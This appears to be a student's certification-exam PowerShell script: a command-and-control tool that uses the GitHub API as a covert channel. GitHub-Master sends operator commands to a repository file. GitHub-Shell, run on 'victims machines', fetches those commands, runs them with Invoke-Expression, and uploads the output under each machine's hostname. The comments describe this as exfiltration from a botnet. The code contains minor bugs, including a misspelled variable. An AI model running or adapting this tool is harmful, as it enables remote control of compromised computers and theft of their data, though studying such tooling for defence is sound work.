## Powershell For Penetration Testers Exam Task 9 - Use a popular third party website for interactive shell.
function GitHub-Master
{ 
<#
.SYNOPSIS
A PowerShell script that use the GitHub API for interactive shell.

.DESCRIPTION
A PowerShell script that use the GitHub API for interactive shell. This script must be executed on the attacker machine, it updates the GitHub file with the command
that the victims will execute and get the result uploaded to the GitHub repository by the victims.

.PARAMTER token
The github authentication token
https://github.com/blog/1509-personal-api-tokens

.PARAMTER githubCmdURI
The github URI with the commands to execute. This value must be the same specified in the victims script.
https://api.github.com/repos/:owner/:repo/contents/:path (ex. https://api.github.com/repos/salu90/PSFPT/contents/commands.txt)

.PARAMTER githubExfURI
The github repository for the exfiltration of the output of the command executed by the victim. This value must be the same specified in the victims script.
https://api.github.com/repos/:owner/:repo/contents/ (ex. https://api.github.com/repos/salu90/PSFPT/contents/cmdFolder/)
It is important to put the "/" character at the end of the path, otherwise it doesn't work

.PARAMTER idleTime
The second to wait between the checks of the GitHub files updated by the victims. Default is 30 seconds.

.PARAMTER commitMessage
The commit message.

.PARAMTER committerName
The author of the commit.

.PARAMTER committerEmail
The email of the author of the commit.

.PARAMTER branch
The repository brach of the the commit.

.EXAMPLE
PS C:\> . .\GitHub-Master
PS C:\> GitHub-Master -token c78d67aaaaaaaa998776545678990s76  -githubCmdURI https://api.github.com/repos/salu90/PSFPT/contents/commands.txt -githubExfURI https://api.github.com/repos/salu90/PSFPT/contents/testFolder/
PS C:\> GitHub-Master -token c78d67aaaaaaaa998776545678990s76  -githubCmdURI https://api.github.com/repos/salu90/PSFPT/contents/commands.txt -githubExfURI https://api.github.com/repos/salu90/PSFPT/contents/testFolder/ -idleTime 60

.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3190
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,

       [Parameter(Mandatory = $true)]
       [String]
       $githubCmdURI,
       
       [Parameter(Mandatory = $true)]
       [String]
       $githubExfURI,

       [Parameter(Mandatory = $false)]
       [int]
       $idleTime = 30,

       [Parameter(Mandatory = $false)]
       [String]
       $commitMessage = 'defaultCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $committerName = 'defaultCommiter',

       [Parameter(Mandatory = $false)]
       [String]
       $committerEmail = 'defaultEmail@default.com',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
    )

    $lastCommand = ""
    

    #Sets github parameters
    $auth = @{"Authorization"="token $token"}
    $committer = @{"name"=$committerName; "email"=$committerEmail}

    While (1) {
    $files = New-Object System.Collections.ArrayList
    $toExecute = Read-Host -Prompt 'Input the command to execute'
    $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($toExecute)
    $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
   
    #Sets github parameters to update files
    $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch;}
    $jsonData = ConvertTo-Json $data
    
  
    #TODO: Optimize this piece of code, it is possible to reduce the number of requests
    #If is the first time create a new file on GitHub, otherwise get the hash of the last file
    try{
    $response = Invoke-WebRequest -Headers $auth -Method PUT -Body $jsonData -Uri $githubCmdURI -UseBasicParsing
    }catch{
    $response =  Invoke-WebRequest -Headers $auth -Method GET -Uri $githubCmdURI  -UseBasicParsing
    $responseString = $response.content
    $splitted = $responseString.split(",")
    foreach ($split in $splitted){
        if ($split.split(":")[0] -match "sha"){
        $sha = $split.split(":")[1].replace('"', '')
        }
    }

    #submit the new command to execute to the github file
    $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch; "sha"=$sha}
    $jsonData = ConvertTo-Json $data
    $response = Invoke-WebRequest -Headers $auth -Method PUT -Body $jsonData -Uri $githubCmdURI -UseBasicParsing
    }

    if (($response.StatusCode -eq 201) -or ($response.StatusCode -eq 200)){
        write-verbose "command updated succesfully!" 
    }
    else {
        write-host "Error updating command to execute" -ForegroundColor Red
    }
   
    Write-Verbose "sleeping $idleTime seconds"
    Start-Sleep -s $idleTime
     
    #Get the list of hostnames belonging to the botnet
    $response =  Invoke-WebRequest -Headers $auth -Method GET -Uri $githubExfURI  -UseBasicParsing
    $responseString = $response.content
    $splitted = $responseString.split(",")
    
    foreach ($split in $splitted){
        if ($split.split(":")[0] -match "name"){
        $url = $split.split(":")[1].replace("\n","").replace('"', '')
        $files.Add($url) > $null
        }
    }

    #get the result of the command executed by each zombie of the botnet 
    foreach ($file in $files){
        
        $filesResponse =  Invoke-WebRequest -Headers $auth -Method GET -Uri $githubExfUri$file  -UseBasicParsing
        $responseString = $filesResponse.content
        $splitted = $responseString.split(",")
        $command = ""
        foreach ($split in $splitted){
            if ($split.split(":")[0] -match "content"){
            $base64 = $split.split(":")[1].replace("\n","").replace('"', '')
            $command =  [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
            write-host "HOSTNAME:"$file -ForegroundColor Green
            write-host $command
            write-host
            }
        }
    }

    }
}

function GitHub-Shell
{ 
<#
.SYNOPSIS
A PowerShell script that use the GitHub API for interactive shell.

.DESCRIPTION
A PowerShell script that use the GitHub API for interactive shell. This script must be executed on the victims machines, it checks the command to execute on a GitHub file and send the output of the command to another one.

.PARAMTER token
The github authentication token
https://github.com/blog/1509-personal-api-tokens

.PARAMTER githubCmdURI
The github URI with the commands to execute. This value must be the same specified in the master script.
https://api.github.com/repos/:owner/:repo/contents/:path (ex. https://api.github.com/repos/salu90/PSFPT/contents/commands.txt)

.PARAMTER githubExfURI
The github repository for the exfiltration of the output of the command executed by the victim. It is important to specify and empty gitHub folder. This value must be the same specified in the master script.
https://api.github.com/repos/:owner/:repo/contents/ (ex. https://api.github.com/repos/salu90/PSFPT/contents/)

.PARAMTER idleTime
The second to wait between the checks of the command on the GitHub file. Default is 30 seconds.

.PARAMTER commitMessage
The commit message.

.PARAMTER committerName
The author of the commit.

.PARAMTER committerEmail
The email of the author of the commit.

.PARAMTER branch
The repository brach of the the commit.

.EXAMPLE
PS C:\> . .\GitHub-Shell
PS C:\> GitHub-Shell -token c78d67aaaaaaaa998776545678990s76  -githubCmdURI https://api.github.com/repos/salu90/PSFPT/contents/commands.txt -githubExfURI https://api.github.com/repos/salu90/PSFPT/contents/testFolder
PS C:\> GitHub-Shell -token c78d67aaaaaaaa998776545678990s76  -githubCmdURI https://api.github.com/repos/salu90/PSFPT/contents/commands.txt -githubExfURI https://api.github.com/repos/salu90/PSFPT/contents/testFolder -idleTime 60

.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3190
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $true)]
       [String]
       $token,
       
       [Parameter(Mandatory = $true)]
       [String]
       $githubCmdURI,

       [Parameter(Mandatory = $true)]
       [String]
       $githubExfURI,

       [Parameter(Mandatory = $false)]
       [int]
       $idleTime = 30,

       [Parameter(Mandatory = $false)]
       [String]
       $commitMessage = 'defaultCommit',

       [Parameter(Mandatory = $false)]
       [String]
       $committerName = 'defaultCommiter',

       [Parameter(Mandatory = $false)]
       [String]
       $committerEmail = 'defaultEmail@default.com',

       [Parameter(Mandatory = $false)]
       [String]
       $branch = 'master'
    )

    $lastCommand = ""

    #Sets github parameters
    $auth = @{"Authorization"="token $token"}
    $committer = @{"name"=$committerName; "email"=$committerEmail}
    $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch}


    While (1) {

    #Get the command to execute from GitHub
    $response =  Invoke-WebRequest -Headers $auth -Method GET -Uri $githubCmdURI  -UseBasicParsing
    $responseString = $response.content
    $splitted = $responseString.split(",")
    $command = ""
    foreach ($split in $splitted){
        if ($split.split(":")[0] -match "content"){
        $base64 = $split.split(":")[1].replace("\n","").replace('"', '')
        $command =  [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
        }
    }

    if($command -ne $lastCommand){

        Write-Verbose "excuting $command"
        #executes the command
        $fileContent = Invoke-Expression -Command:$command 

        #gets the content of the file to exfiltrate and converts it to base64
        $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
        $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)

        #Sets github parameters for exfiltration to GitHub of the command executed
        $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch;}
        $jsonData = ConvertTo-Json $data

        #set the name of the file where to write the output of the command executed, to recongnize the machine of the botnet the name is the hostname of the machine
        $hostname = Invoke-Expression -Command:hostname  

        $githubExfURIFinal = "$githubExfURI/$hostname.txt"
   
        Write-Verbose "uploding file: $githubExfURIFinal"
   

        #TODO Optimize this piece of code, it is possible to reduce the number of requests
        #If is the first time create a new file on GitHub, otherwise get the hash of the last file
        try{
        $response = Invoke-WebRequest -Headers $auth -Method PUT -Body $jsonData -Uri $githubExfURIFinal -UseBasicParsing
        }catch{
        $response =  Invoke-WebRequest -Headers $auth -Method GET -Uri $githubExfURIFinal  -UseBasicParsing
        $responseString = $response.content
        $splitted = $responseString.split(",")
        foreach ($split in $splitted){
            if ($split.split(":")[0] -match "sha"){
            $sha = $split.split(":")[1].replace('"', '')
          }
        }

        #submit the commands executed to the github file
        $data = @{"path"=$fileName; "message"=$commitMessage; "committer"=$committer; "content"=$fileContentEncoded; "branch"=$branch; "sha"=$sha}
        $jsonData = ConvertTo-Json $data
        $response = Invoke-WebRequest -Headers $auth -Method PUT -Body $jsonData -Uri $githubExfURIFinal -UseBasicParsing
        }

        if (($response.StatusCode -eq 201) -or ($response.StatusCode -eq 200)){
            write-verbose "File uploaded succesfully!"
        }
        else {
            write-verbose "Error"
        }
        $lastCommand = $comand
        }

     Write-Verbose "sleeping $idleTime seconds"
     Start-Sleep -s $idleTime
    }
    
}